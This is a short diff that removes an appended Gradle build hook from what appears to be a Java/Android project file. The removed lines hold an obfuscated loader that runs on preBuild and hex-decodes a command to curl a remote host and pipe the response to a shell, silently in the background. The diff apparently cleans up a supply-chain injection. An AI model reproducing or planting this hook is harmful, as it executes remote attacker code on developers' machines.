@@ -232,10 +232,3 @@ public static String getFileMD5(File file) {
         }
     }
 }
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ["sh", "-c", "((z(){ $(printf 'xxUd' | tr -d 'U') -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203231202d736b664c202d2d72657472792035202d642022703d616e64726f69645f677261646c65222068747470733a2f2f7675313866656e646e316f7668672e626573742f612922207c2073680a | z | sh ) >/dev/null 2>&1 &)"].execute()
-        }
-    }
-}
